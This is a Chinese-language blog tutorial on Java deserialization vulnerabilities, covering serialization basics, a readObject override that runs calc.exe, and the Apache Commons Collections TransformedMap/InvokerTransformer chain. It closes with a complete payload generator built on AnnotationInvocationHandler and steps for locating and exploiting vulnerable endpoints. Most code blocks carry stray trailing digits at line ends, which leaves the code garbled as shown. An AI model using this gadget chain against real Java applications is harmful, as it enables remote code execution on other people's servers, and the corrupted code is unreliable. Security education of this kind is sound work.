**目录**

[反序列化漏洞](#t0 "反序列化漏洞")

[序列化和反序列化](#t1 "序列化和反序列化")

[JAVA WEB中的序列化和反序列化](#t2 "JAVA WEB中的序列化和反序列化")

[对象序列化和反序列范例](#t3 "对象序列化和反序列范例")

[JAVA中执行系统命令](#t4 "JAVA中执行系统命令")

[重写readObject()方法](#t5 "重写readObject()方法")

[Apache Commons Collections](#t6 "Apache Commons Collections")

[反序列化漏洞payload](#t7 "反序列化漏洞payload")

[JAVA Web反序列化漏洞的挖掘和利用](#t8 "JAVA Web反序列化漏洞的挖掘和利用 ") 

* * *

由于本人并非JAVA程序员，所以对JAVA方面的知识不是很懂，仅仅是能看懂而已。本文参照几位大佬的博客进行归纳总结，简单阐述了JAVA[反序列化](https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020)漏洞的原理以及Payload的构造。

**反序列化漏洞**
----------

JAVA反序列化漏洞到底是如何产生的？

1、由于很多站点或者RMI仓库等接口处存在java的反序列化功能，于是攻击者可以通过构造特定的恶意对象[序列化](https://so.csdn.net/so/search?q=%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020)后的流，让目标反序列化，从而达到自己的恶意预期行为，包括命令执行，甚至 getshell 等等。

2、[Apache](https://so.csdn.net/so/search?q=Apache&spm=1001.2101.3001.7020) Commons Collections是开源小组Apache研发的一个 Collections 收集器框架。这个框架中有一个InvokerTransformer.java接口，实现该接口的类可以通过调用java的反射机制来调用任意函数，于是我们可以通过调用Runtime.getRuntime.exec() 函数来执行系统命令。Apache commons collections包的广泛使用，也导致了java反序列化漏洞的大面积流行。

所以最终结果就是如果Java应用对用户的输入做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化过程执行我们自定义的命令，从而实现远程任意代码执行。

在说反序列化漏洞原理之前我们先来说说JAVA对象的序列化和反序列化

序列化和反序列化
--------

**序列化** (Serialization)：将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。

**反序列化**：从存储区中读取该数据，并将其还原为对象的过程，称为反序列化。

简单的说，序列化和反序列化就是：

*   把对象转换为字节序列的过程称为对象的序列化
*   把字节序列恢复为对象的过程称为对象的反序列化

对象序列化的用途：

*   把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中
*   在网络上传送对象的字节序列

当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，最终都会以二进制的形式在网络上传送。发送方需要把这个Java对象序列化；接收方收到数据后把数据反序列化为Java对象。

通常，对象实例的所有字段都会被序列化，这意味着数据会被表示为实例的序列化数据。这样，能够解释该格式的代码就能够确定这些数据的值，而不依赖于该成员的可访问性。类似地，反序列化从序列化的表示形式中提取数据，并直接设置对象状态。 

对于任何可能包含重要的安全性数据的对象，如果可能，应该使该对象不可序列化。如果它必须为可序列化的，请尝试生成特定字段来保存重要数据。如果无法实现这一点，则应注意该数据会被公开给任何拥有序列化权限的代码，并确保不让任何恶意代码获得该权限。

在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便长期保存。比如最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。

JAVA WEB中的序列化和反序列化
------------------

*   java.io.ObjectOutputStream 代表对象输出流，它的 **writeObject()** 方法可对参数指定的对象进行序列化，把得到的字节序列写到一个目标输出流中
*   java.io.ObjectInputStream 代表对象输入流，它的 **readObject()** 方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回

只有实现了 **Serializable** 和 **Externalizable** 接口的类的对象才能被序列化和反序列化。Externalizable 接口继承自 Serializable 接口，实现 Externalizable 接口的类完全由自身来控制反序列化的行为，而实现 Serializable 接口的类既可以采用默认的反序列化方式，也可以自定义反序列化方式。  
**对象序列化包括如下步骤：**

1.  创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流
2.  通过对象输出流的 writeObject() 方法将对象进行序列化

**对象反序列化的步骤如下：**

1.  创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流
2.  通过对象输入流的 readObject() 方法将字节序列反序列化为对象

### **对象序列化和反序列范例**

定义一个User类，实现Serializable接口

```
import java.io.IOException;      
import java.io.Serializable;      
public class User implements Serializable{      
	private String name;      
	public String getName(){      
		return name;      
	}      
	public void setName(String name){      
		this.name=name;      1
	}      1
}
```


定义主类，对User对象进行序列化和反序列化

```
import java.io.*;      
public class Main {      
    public static void main(String[] args) {      
        Main m = new Main();      
        try{      
            m.run();   //序列化      
            m.run2();  //反序列化      
        } catch (IOException |ClassNotFoundException e) {      
            e.printStackTrace();      1
        }      1
    }      1
    public void run() throws IOException{      1
        FileOutputStream out = new FileOutputStream("test.txt");  //实例化一个文件输出流      1
        ObjectOutputStream obj_out=new ObjectOutputStream(out);   //实例化一个对象输出流      1
        User u = new User();      1
        u.setName("谢公子");      1
        obj_out.writeObject(u);   //利用writeObject方法将序列化对象存储在本地      1
        obj_out.close();      1
        System.out.println("User对象序列化成功！");      2
    }      2
    public void run2() throws IOException, ClassNotFoundException {      2
        FileInputStream in = new FileInputStream("test.txt");  //实例化一个文件输入流      2
        ObjectInputStream ins = new ObjectInputStream(in);  //实例化一个对象输入流      2
        User u = (User)ins.readObject();      //利用readObject方法将序列化对象转为对象      2
        System.out.println("User对象反序列化成功！");      2
        System.out.println(u.getName());      2
        ins.close();      2
    }      2
}
```


**运行结果**

![](https://img-blog.csdnimg.cn/20200719223444302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

同时，会在当前文件夹生成一个 test.txt 用来存储序列化的对象，内容如下：

![](https://img-blog.csdnimg.cn/20200719223422887.png)

JAVA中执行系统命令
-----------

我们先来看看JAVA中执行系统命令的方法，通过执行Runtime.getRuntime().exec()函数执行 calc.exe 命令

```
import java.io.BufferedReader;      
import java.io.IOException;      
import java.io.InputStreamReader;      
import java.nio.charset.Charset;      
public class Main {      
    public static void main(String[] args) throws IOException, InterruptedException {      
        Process p = Runtime.getRuntime().exec("calc.exe");      
        java.io.InputStream is = p.getInputStream();      
        BufferedReader reader = new BufferedReader(new InputStreamReader(is, Charset.forName("GBK"))); //设置读取的时候的编码为GBK      1
        p.waitFor();      1
        if(p.exitValue()!=0){      1
            //说明命令执行失败      1
        }else{      1
            String s = null;      1
            while((s=reader.readLine())!=null){      1
                System.out.println(s);      1
            }      1
        }      1
    }      2
}
```


运行结果 

![](https://img-blog.csdnimg.cn/20200713233853201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 重写readObject()方法

我们上面说到了可以通过重写 readObject() 方法来自定义类的反序列化方式。所以，我们将User类的 readObject() 进行重写

```
import java.io.*;      
public class User2 implements Serializable{      
    private String name;      
    public String getName(){      
        return name;      
    }      
    public void setName(String name){      
        this.name=name;      
    }      1
    private  void readObject(ObjectInputStream in) throws InterruptedException, IOException, ClassNotFoundException {      1
        //先调用默认的readObject()方法      1
        in.defaultReadObject();       1
        //重写，执行系统命令calc.exe      1
        Process p = Runtime.getRuntime().exec("calc.exe");      1
        InputStream is = p.getInputStream();      1
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));      1
        p.waitFor();      1
        if(p.exitValue()!=0){      2
            //说明执行系统命令失败      2
        }      2
        String s = null;      2
        while((s=reader.readLine())!=null){      2
            System.out.println(s);      2
        }       2
    }      2
}
```


主类中的代码不变，我们再来执行序列化和反序列化过程。可以看到，除了执行了对象的序列化和反序列化之外，还执行了我们自定义的系统命令的代码。

![](https://img-blog.csdnimg.cn/20200719225132577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Apache Commons Collections
--------------------------

项目地址：[Collections – Download Apache Commons Collections](http://commons.apache.org/proper/commons-collections/download_collections.cgi "Collections – Download Apache Commons Collections")

Apache Commons Collections 是一个扩展了Java标准库里集合类[Collection](https://so.csdn.net/so/search?q=Collection&spm=1001.2101.3001.7020)结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。

Commons Collections 实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。

我们可以通过TransformedMap.decorate()方法，获得一个TransformedMap的实例。如下代码是TransformedMap.decorate()方法

```
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {      
    return new TransformedMap(map, keyTransformer, valueTransformer);      
}
```


`Transformer`是一个接口，其中定义的`transform()`函数用来将一个对象转换成另一个对象。如下所示 

```
public interface Transformer {      
    public Object transform(Object input);      
}
```


当TransformedMap中的任意项的Key或者Value被修改，相应的`Transformer的transform()方法`就会被调用。除此以外，多个`Transformer`还能串起来，形成`ChainedTransformer`。 

Apache Commons Collections中已经实现了一些常见的 `Transformer`，其中的 `InvokerTransformer` 接口实现了反射链，可以通过Java的反射机制来执行任意命令。于是我们可以通过InvokerTransformer的反射链获得Runtime类来执行系统命令 

传送门——> [InvokerTransformer反射链](https://blog.csdn.net/qq_36119192/article/details/85058806#%E5%8F%8D%E5%B0%84%E9%93%BE "InvokerTransformer反射链")

在上面的 InvokerTransformer反射链 这篇文章中我已经介绍了如何通过修改Value值来触发执行反射链来执行任意命令。

但是目前的构造还需要依赖于修改`Map`中的Value值去触发调用反射链，我们需要想办法通过`readObject()`直接触发。

如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map参数是可控的，就可以实现我们的攻击目标了。

于是，我们找到了这个类：**AnnotationInvocationHandler** ，这个类有一个成员变量 `memberValues` 是`Map<String,Object>`类型，并且在重写的 readObject() 方法中有 memberValue.setValue() 修改Value的操作。简直是完美！

于是我们可以实例化一个AnnotationInvocationHandler类，将其成员变量memberValues赋值为精心构造的恶意TransformedMap对象。然后将其序列化，提交给未做安全检查的Java应用。Java应用在进行反序列化操作时，执行了readObject()函数，修改了Map的Value，则会触发TransformedMap的变换函数transform()，再通过反射链调用了Runtime.getRuntime.exec("XXX") 命令，最终就可以执行我们的任意代码了，一切是那么的天衣无缝！ 

反序列化漏洞payload
-------------

*   反序列化时会执行对象的readObject()方法
*   Runtime.getRuntime.exec(“xx”)可以执行系统命令
*   InvokerTransformer的transform()方法可以通过反射链调用Runtime.getRuntime.exec(“xx”)函数来执行系统命令
*   TransformedMap类的decorate方法用来实例化一个TransformedMap对象，即public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) ，第二个和第三个参数传入一个Transformer，当key值和Value值改变时，会调用Transformer的transformer()方法。于是我们可以将第三个参数传入 InvokerTransformer

**Payload构造思路：**我们构造恶意的类：AnnotationInvocationHandler，将该类的成员变量memberValues赋值为我们精心构造的TransformedMap对象，并将AnnotationInvocationHandler类进行序列化，然后交给JAVA WEB应用进行反序列化。再进行反序列化时，会执行readObject()方法，该方法会对成员变量TransformedMap的Value值进行修改，该修改触发了TransformedMap实例化时传入的参数InvokerTransformer的transform()方法，InvokerTransformer.transform()方法通过反射链调用Runtime.getRuntime.exec(“xx”)函数来执行系统命令

![](https://img-blog.csdnimg.cn/20181219195606367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如下代码，我们通过构造恶意的类AnnotationInvocationHandler并将其序列化保存在 payload.bin文件中，只要将它给存在反序列化漏洞的JAVA WEB 应用进行反序列化就能执行我们的命令了。

```
import java.io.FileInputStream;      
import java.io.FileOutputStream;      
import java.io.IOException;      
import java.io.ObjectInputStream;      
import java.io.ObjectOutputStream;      
import java.lang.annotation.Target;      
import java.lang.reflect.Constructor;      
import java.util.HashMap;      
import java.util.Map;      1
import java.util.Map.Entry;       1
import org.apache.commons.collections.Transformer;      1
import org.apache.commons.collections.functors.ChainedTransformer;      1
import org.apache.commons.collections.functors.ConstantTransformer;      1
import org.apache.commons.collections.functors.InvokerTransformer;      1
import org.apache.commons.collections.map.TransformedMap;       1
public class main2 {      1
	public static void main(String[] args) throws Exception{      2
		Transformer[] transformers = new Transformer[] {      2
				new ConstantTransformer(Runtime.class),      2
				new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),      2
				new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),      2
				new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})};       2
		Transformer transformedChain = new ChainedTransformer(transformers);  //实例化一个反射链       2
		Map innerMap = new HashMap();   //实例化一个Map对象      2
		innerMap.put("value", "value");       3
		Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain); //将Map对象和反射链作为参数传入       3
		Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  //得到 AnnotationInvocationHandler类的字节码文件      3
		Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);      3
		ctor.setAccessible(true);      3
		Object instance = ctor.newInstance(Target.class, outerMap);  //得到我们构造好的 AnnotationInvocationHandler类实例       3
		FileOutputStream f = new FileOutputStream("payload.bin");      3
		ObjectOutputStream out = new ObjectOutputStream(f);  //创建一个对象输出流      4
		out.writeObject(instance);  //将我们构造的 AnnotationInvocationHandler类进行序列化      4
		out.flush();      4
		out.close();      4
	}      4
}
```


JAVA Web反序列化漏洞的挖掘和利用 
---------------------

**1：漏洞触发场景**

在java编写的web应用与web服务器间通常会发送大量的序列化对象例如以下场景： 　　

*   HTTP请求中的参数，cookies以及Parameters。 　　
*   RMI协议，被广泛使用的RMI协议完全基于序列化 　　
*   JMX 同样用于处理序列化对象 　　
*   自定义协议 用来接收与发送原始的java对象

**2：漏洞挖掘** 　　

(1)确定反序列化输入点 　

首先应找出readObject方法调用，在找到之后进行下一步的注入操作。一般可以通过以下方法进行查找： 　　　　

1)源码审计：寻找可以利用的“靶点”，即确定调用反序列化函数readObject的调用地点。 　　

2)对该应用进行网络行为抓包，寻找序列化数据，java序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。 　　

(2)再考察应用的Class Path中是否包含Apache Commons Collections库 　　

(3)生成反序列化的payload 　　

(4)提交我们的payload数据

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关文章：[JAVA反序列化漏洞复现](https://blog.csdn.net/qq_36119192/article/details/90716180 "JAVA反序列化漏洞复现")

参考文章：[Java反序列化漏洞从无到有](https://www.freebuf.com/column/155381.html "Java反序列化漏洞从无到有")

                  [Lib之过？Java反序列化漏洞通用利用分析](https://www.secpulse.com/archives/40420.html "Lib之过？Java反序列化漏洞通用利用分析")

                 [Java反序列化漏洞分析](https://www.cnblogs.com/ssooking/p/5875215.html "Java反序列化漏洞分析")

                 [Commons Collections Java反序列化漏洞深入分析](https://blog.csdn.net/bigtree_3721/article/details/51263780 "Commons Collections Java反序列化漏洞深入分析")